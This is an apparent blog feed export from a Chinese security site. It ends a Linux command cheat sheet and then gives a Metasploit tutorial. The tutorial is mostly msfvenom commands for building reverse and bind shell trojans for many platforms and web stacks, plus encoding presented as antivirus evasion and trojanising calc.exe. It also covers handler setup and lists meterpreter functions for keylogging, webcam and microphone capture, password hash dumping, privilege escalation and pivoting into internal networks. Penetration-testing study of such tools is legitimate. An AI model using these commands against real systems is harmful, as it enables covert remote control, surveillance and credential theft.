<h4 id="消除重复行-uniq"><a href="#消除重复行-uniq" class="headerlink" title="消除重复行(uniq)"></a>消除重复行(uniq)</h4><p>消除重复行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq</div></pre></td></tr></table></figure></p>
<p>统计各行在文件中出现的次数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq -c</div></pre></td></tr></table></figure></p>
<p>找出重复行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq -d</div></pre></td></tr></table></figure></p>
<h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><p>查看磁盘空间利用大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">df -h</div></pre></td></tr></table></figure></p>
<p>挂载U盘<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">fdisk -l 查看U盘路径</div><div class="line">monut /dev/sdb4 /mnt  挂载U盘</div><div class="line"><span class="built_in">cd</span> /mnt 进入U盘</div><div class="line">umount /mnt  退出U盘</div></pre></td></tr></table></figure></p>
<h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><p>杀死python相关的进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ps -ef | grep python | cut -d <span class="string">' '</span> -f 2 | xargs <span class="built_in">kill</span></div><div class="line">或者</div><div class="line">pkill -9 python  <span class="comment">#-9表示强制删除，pkill以进程名字匹配</span></div></pre></td></tr></table></figure></p>
<p>查看进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -ef | less</div></pre></td></tr></table></figure></p>
<p>查看端口占用的进程状态：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsof -i:3306</div></pre></td></tr></table></figure></p>
<h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><p>查看网络连接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -an | less</div></pre></td></tr></table></figure></p>
<p>查看网络路由<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route -n</div></pre></td></tr></table></figure></p>
<p>只查看ip信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig | grep inet</div></pre></td></tr></table></figure></p>
<h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><p>查看系统位数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>查看系统版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release -a</div></pre></td></tr></table></figure></p>
<p>查看hosts文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/hosts</div></pre></td></tr></table></figure></p>
<p>查看CPU的核的个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /proc/cpuinfo | grep processor | wc -l</div></pre></td></tr></table></figure></p>
<p>查看系统信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">uname -a</div><div class="line">uname -m 显示机器的处理器架构</div><div class="line">uname -r 显示正在使用的内核版本</div><div class="line">cat /proc/cpuinfo 显示CPUinfo的信息</div><div class="line">cat /proc/meminfo 校验内存使用</div><div class="line">cat /proc/version 显示内核的版本</div><div class="line">cat /proc/net/dev 显示网络适配器及统计</div><div class="line">cat /proc/mounts 显示已加载的文件系统</div></pre></td></tr></table></figure></p>
<h3 id="性能管理"><a href="#性能管理" class="headerlink" title="性能管理"></a>性能管理</h3><h4 id="CPU-sar"><a href="#CPU-sar" class="headerlink" title="CPU(sar)"></a>CPU(sar)</h4><p>查看CPU使用率<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sar -u</div></pre></td></tr></table></figure></p>
<p>查看CPU平均负载<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sar -q 1 2</div></pre></td></tr></table></figure></p>
<h4 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h4><p>查看内存使用情况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sar -r 1 2</div><div class="line">或者</div><div class="line">free -m</div></pre></td></tr></table></figure></p>
<h4 id="网络流量监控-iftop"><a href="#网络流量监控-iftop" class="headerlink" title="网络流量监控(iftop)"></a>网络流量监控(iftop)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo iftop -i eth1 -B <span class="comment">#-i 指定网卡，-B以byte显示，可以使用-h查看帮助信息</span></div></pre></td></tr></table></figure>
<h3 id="其他内容"><a href="#其他内容" class="headerlink" title="其他内容"></a>其他内容</h3><h4 id="管道和重定向-、-、-amp-amp-、-gt-、-gt-gt"><a href="#管道和重定向-、-、-amp-amp-、-gt-、-gt-gt" class="headerlink" title="管道和重定向(|、||、&amp;&amp;、&gt;、&gt;&gt;)"></a>管道和重定向(|、||、&amp;&amp;、&gt;、&gt;&gt;)</h4><ul>
<li>批处理命令连接执行，使用 |</li>
<li>串联使用分号 ;</li>
<li>前面成功，则执行后面一条，否则不执行:&amp;&amp;</li>
<li>前面失败，则后一条执行: ||</li>
<li><em>&gt;</em>覆盖原有内容</li>
<li><em>&gt;&gt;</em>文件后追加内容</li>
</ul>
<p>重定向<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="built_in">test</span> &gt; test.txt <span class="comment">#覆盖原有内容</span></div><div class="line"><span class="built_in">echo</span> <span class="built_in">test</span> &gt;&gt; test.txt <span class="comment">#文件后追加内容</span></div></pre></td></tr></table></figure></p>
<p>清空文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:&gt; test.txt</div></pre></td></tr></table></figure></p>
<p>nohup输出重定向<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nohup python revice_true_link.py &gt; ./<span class="built_in">log</span>/true_link.log &amp;</div></pre></td></tr></table></figure></p>
<h4 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h4><ul>
<li>Ctl-U   删除光标到行首的所有字符,在某些设置下,删除全行</li>
<li>Ctl-W   删除当前光标到前边的最近一个空格之间的字符</li>
<li>Ctl-H   backspace,删除光标前边的字符</li>
<li>Ctl-R   匹配最相近的一个文件，然后输出</li>
<li>Ctl-a   光标移动到行首</li>
<li>Ctl-e   光标移动到行尾</li>
</ul>
<h4 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h4><p>访问远程资源，下载资源</p>
<ul>
<li>wget　　作用：下载远程文件  如：<a href="http://www.xxx.com/1.txt" target="_blank" rel="external">http://www.xxx.com/1.txt</a></li>
<li>curl　　作用：访问网页，返回包内容</li>
</ul>
<h4 id="程序运行"><a href="#程序运行" class="headerlink" title="程序运行"></a>程序运行</h4><ul>
<li>watch 运行的脚本 -n 秒数　　（几秒钟执行一次，不加n默认为2秒）</li>
<li>nohup 要运行的程序 &amp;　　(让程序在后台运行，忽略所有挂断信号)</li>
</ul>
<h3 id="Linux学习网站"><a href="#Linux学习网站" class="headerlink" title="Linux学习网站"></a>Linux学习网站</h3><ul>
<li><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/" target="_blank" rel="external">http://linuxtools-rst.readthedocs.io/zh_CN/latest/</a></li>
<li><a href="http://man.linuxde.net/" target="_blank" rel="external">http://man.linuxde.net/</a></li>
</ul>
<h3 id="本文内容参考"><a href="#本文内容参考" class="headerlink" title="本文内容参考"></a>本文内容参考</h3><p><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/" target="_blank" rel="external">http://linuxtools-rst.readthedocs.io/zh_CN/latest/</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
<p><em>注：本文内容部分来自互联网整理，部分来自个人经验总结；本文将持续收集更新，欢迎留言补充！</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;即使跌倒了，你要懂得抓一把沙子在手里。&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　随着对安全技术探索的逐步深入，我深刻体会到掌握linux系统对于安全研究的重要性。而掌握Linux系统首先必须得学会一些常用的linux命令，其次再去掌握一些linux常用工具，最后再是深入理解linux系统内核等。因此本篇作为该系列的第一篇，主要用来记录分享一些自己常用且基础的Linux命令。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>【渗透神器系列】Metasploit</title>
    <link href="http://thief.one/2017/08/01/1/"/>
    <id>http://thief.one/2017/08/01/1/</id>
    <published>2017-08-01T10:03:08.000Z</published>
    <updated>2017-08-03T04:26:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Learn to walk before you run<br>先学走，再学跑</blockquote><br>　　今天玩了一把内网渗透，其中主要用到了metasploit这款内网渗透神器。metasploit大家肯定不陌生，我也在很早之前就有接触过，但每次重新使用它时都会遗忘一些用法，因此为了方便查询我在本篇记录下metasploit神器的一些常用命令，以及内网渗透中如何使用它。<br><a id="more"></a></p>
<h3 id="Mac下安装metasploit"><a href="#Mac下安装metasploit" class="headerlink" title="Mac下安装metasploit"></a>Mac下安装metasploit</h3><p>mac下安装metasploit比较简单，官网下载pkg安装包，直接安装即可；需要注意的是安装完成后的路径。<br>msfconsole路径：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/metasploit-framework/bin</div></pre></td></tr></table></figure></p>
<p>该目录下还有其他几个常用的工具：<br><img src="/upload_image/20170801/1.png" alt=""><br>msf的插件路径：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/metasploit-framework/embedded/framework/modules/exploits</div></pre></td></tr></table></figure></p>
<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>作用：生成木马文件，替代早期版本的msfpayload和msfencoder。</p>
<h4 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h4><p>msfvenom命令行选项如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</div><div class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</div><div class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</div><div class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --<span class="built_in">help</span>-formats 来获取msf支持的输出格式列表)</div><div class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</div><div class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</div><div class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</div><div class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</div><div class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;<span class="comment">#039;\x00\xff&amp;#039;</span></div><div class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</div><div class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</div><div class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</div><div class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</div><div class="line">    --payload-options            列举payload的标准选项</div><div class="line">-o, --out   &lt;path&gt;               保存payload</div><div class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</div><div class="line">    --shellest                   最小化生成payload</div><div class="line">-h, --<span class="built_in">help</span>                       查看帮助选项</div><div class="line">    --<span class="built_in">help</span>-formats               查看msf支持的输出格式列表</div></pre></td></tr></table></figure></p>
<h4 id="options-usage"><a href="#options-usage" class="headerlink" title="options usage"></a>options usage</h4><p>查看支持的payload列表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -l payloads</div></pre></td></tr></table></figure></p>
<p>查看支持的输出文件类型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom --<span class="built_in">help</span>-formats</div></pre></td></tr></table></figure></p>
<p>查看支持的编码方式：(为了达到免杀的效果)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -l encoders</div></pre></td></tr></table></figure></p>
<p>查看支持的空字段模块：(为了达到免杀的效果)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -l nops</div></pre></td></tr></table></figure></p>
<h4 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h4><p>命令格式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</div></pre></td></tr></table></figure></p>
<p>Linux<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">反向连接：</div><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div><div class="line">正向连接：</div><div class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure></p>
<p>Windows<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div></pre></td></tr></table></figure></p>
<p>Mac<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div><div class="line">Web Payloads</div></pre></td></tr></table></figure></p>
<p>PHP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">'&lt;?php '</span> | tr -d <span class="string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div></pre></td></tr></table></figure></p>
<p>ASP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure></p>
<p>JSP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure></p>
<p>WAR<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.wa</div><div class="line">Scripting Payloads</div></pre></td></tr></table></figure></p>
<p>Python<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure></p>
<p>Bash<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure></p>
<p>Perl<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure></p>
<p>Linux Based Shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</div></pre></td></tr></table></figure></p>
<p>Windows Based Shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</div></pre></td></tr></table></figure></p>
<p>Mac Based Shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</div><div class="line">Handlers</div></pre></td></tr></table></figure></p>
<h4 id="payload加编码"><a href="#payload加编码" class="headerlink" title="payload加编码"></a>payload加编码</h4><p>命令格式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -a &lt;arch&gt; --platform &lt;platform&gt; -e &lt;encoder option&gt; -i &lt;encoder <span class="built_in">times</span>&gt; -b &lt;bad-chars&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</div></pre></td></tr></table></figure></p>
<p>常用编码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">x86/shikata_ga_nai</div><div class="line">cmd/powershell_base64</div></pre></td></tr></table></figure></p>
<p>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -f exe &gt; 1.exe</div></pre></td></tr></table></figure></p>
<h4 id="自选模块"><a href="#自选模块" class="headerlink" title="自选模块"></a>自选模块</h4><p>生成执行计算器payload例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; 1.exe</div></pre></td></tr></table></figure></p>
<h4 id="payload的坑"><a href="#payload的坑" class="headerlink" title="payload的坑"></a>payload的坑</h4><p>正常情况下，利用msfvenom生成的木马文件，可直接上传到目标服务器上运行（加权限）。但我自己遇到过一个坑，生成的文件内容有部分是无用的，会引起报错，如下图所示。<br><img src="/upload_image/20170801/2.png" alt=""><br><img src="/upload_image/20170801/3.png" alt=""><br>解决方案是vim文件，删除文件开头两行无效的内容。</p>
<h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>作用：用来在命令行下启动metasploit。<br><img src="/upload_image/20170801/4.png" alt=""><br>启动后可看到metasploit当前版本，以及各个模块的插件数量。</p>
<ul>
<li>auxiliary扫描模块</li>
<li>exploits漏洞利用模块</li>
<li>payloads</li>
<li>encoders编码模块</li>
<li>nops空字符模块</li>
</ul>
<h4 id="search寻找模块"><a href="#search寻找模块" class="headerlink" title="search寻找模块"></a>search寻找模块</h4><p>比如寻找ms15_034漏洞的利用插件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">search ms15_034</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170801/5.png" alt=""></p>
<h4 id="配合木马弹Shell"><a href="#配合木马弹Shell" class="headerlink" title="配合木马弹Shell"></a>配合木马弹Shell</h4><p>前面我介绍了如何使用msfvenom生成木马文件，这里我介绍如何使用msf连接上被执行的木马文件，达到控制目标服务器。</p>
<h5 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h5><p>首先我们回顾一下生成木马文件的命令，其中有一个payload的选项，常用的几个payload。<br>linux相关payload：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">linux/x86/meterpreter/reverse_tcp</div><div class="line">linux/x86/meterpreter/bind_tcp</div><div class="line">linux/x86/shell_bind_tcp</div><div class="line">linux/x86/shell_reverse_tcp</div><div class="line">linux/x64/shell_reverse_tcp</div><div class="line">linux/x64/shell_bind_tcp</div></pre></td></tr></table></figure></p>
<p>windows相关payload:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">windows/meterpreter/reverse_tcp</div><div class="line">windows/meterpreter/bind_tcp</div><div class="line">windows/shell_reverse_tcp</div><div class="line">windows/shell_bind_tcp</div><div class="line">windows/x64/meterpreter/reverse_tcp</div><div class="line">windows/x64/meterpreter/bind_tcp</div><div class="line">windows/x64/shell_reverse_tcp</div><div class="line">windows/x64/shell_bind_tcp</div></pre></td></tr></table></figure></p>
<p>注意：含有x64只适用目标服务器为64位操作系统的，没有x64或者使用x86的只适用32位操作系统；含有meterpreter的模块会反弹meterpreter_shell，而普通的shell模块只会反弹普通的shell（反弹结果跟nc类似）；reverse_tcp表示木马会主动连接目标服务器，bind_tcp表示木马会监听本地的端口，等待攻击者连接。因此生成的木马文件，要根据具体情况而定。</p>
<h5 id="payload选择"><a href="#payload选择" class="headerlink" title="payload选择"></a>payload选择</h5><p>前面介绍了常用的payload，那么payload选择的三大要素如下：</p>
<ul>
<li>木马连接的方向</li>
<li>目标操作系统及版本</li>
<li>反弹的shell类型</li>
</ul>
<p>木马连接方向：<br>msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试，详细参考：<a href="https://thief.one/SecWeb/%2F2017%2F04%2F10%2F1%2F">【渗透神器系列】nc</a>）</p>
<p>目标操作系统类型查看：这个不说了！<br>操作系统位数查看：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>反弹shell类型：<br>这个主要取决于反弹的shell的用途，一般执行系统命令的话普通操作系统的shell就够了。如果想要使用高级功能，比如：键盘记录，开启摄像头，添加路由等功能，可以使用meterpreter_shell。</p>
<h5 id="连接木马"><a href="#连接木马" class="headerlink" title="连接木马"></a>连接木马</h5><p>开启msf，启用exploit/multi/handler模块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp</div><div class="line">show options</div><div class="line"><span class="built_in">set</span> RHOST 10.0.0.1</div><div class="line"><span class="built_in">set</span> LPORT 12345  </div><div class="line">exploit</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170801/6.png" alt=""></p>
<p>注意：这里set的payload跟生成木马使用的payload要一致，其余的参数根据选择的payload而填写。</p>
<h4 id="meterpreter-shell"><a href="#meterpreter-shell" class="headerlink" title="meterpreter shell"></a>meterpreter shell</h4><p>当我们拿到目标服务器的meterpreter_shell后，可以进行很多操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">backgroud 将msf进程放到后台</div><div class="line">session -i 1 将进程拖回前台运行</div><div class="line">run vnc 远程桌面的开启</div></pre></td></tr></table></figure></p>
<p>文件管理功能：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Download     下载文件</div><div class="line">Edit          编辑</div><div class="line">cat           查看</div><div class="line">mkdir         创建</div><div class="line">mv            移动</div><div class="line">rm            删除</div><div class="line">upload        上传         </div><div class="line">rmdir         删除文件夹</div></pre></td></tr></table></figure></p>
<p>网络及系统操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Arp          看ARP缓冲表</div><div class="line">Ifconfig     IP地址网卡</div><div class="line">Getproxy     获取代理</div><div class="line">Netstat      查看端口链接</div><div class="line">Kill         结束进程</div><div class="line">Ps           查看进程</div><div class="line">Reboot       重启电脑</div><div class="line">Reg          修改注册表</div><div class="line">Shell        获取shell</div><div class="line">Shutdown     关闭电脑</div><div class="line">sysinfo      获取电脑信息</div></pre></td></tr></table></figure></p>
<p>用户操作和其他功能讲解:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">enumdesktops     用户登录数</div><div class="line">keyscan_dump　　 键盘记录－下载</div><div class="line">keyscan_start　　键盘记录　－　开始</div><div class="line">keyscan_stop 　　键盘记录　－　停止</div><div class="line">Uictl　　　　　　获取键盘鼠标控制权</div><div class="line">record_mic　　　 音频录制</div><div class="line">webcam_chat　　　查看摄像头接口</div><div class="line">webcam_list　　　查看摄像头列表</div><div class="line">webcam_stream　　摄像头视频获取</div><div class="line">Getsystem　　　　获取高权限</div><div class="line">Hashdump　　　   下载ＨＡＳＨ</div></pre></td></tr></table></figure></p>
<h4 id="meterpreter添加路由"><a href="#meterpreter添加路由" class="headerlink" title="meterpreter添加路由"></a>meterpreter添加路由</h4><p>大多时候我们获取到的meterpreter shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。</p>
<p>查看shell网络环境：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;run get_local_subnets</div></pre></td></tr></table></figure></p>
